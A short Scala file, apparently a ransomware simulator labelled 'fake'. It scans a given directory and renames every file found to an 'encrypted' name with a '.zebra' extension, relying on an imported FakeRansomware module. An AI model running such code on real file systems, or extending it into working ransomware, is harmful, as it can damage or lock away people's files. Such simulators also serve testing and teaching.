package fake

import FakeRansomware._
import java.nio.file._

object Zebra {
	implicit val zebraEnding = ".zebra"
	
	def main(args: Array[String]): Unit = {
		val path = args(0)
		Try {
			val encryptedFiles = scan(Paths.get(path)).map(p => Files.move(p, p.resolveSibling(encrypt(p.toString))))
		}
	}
}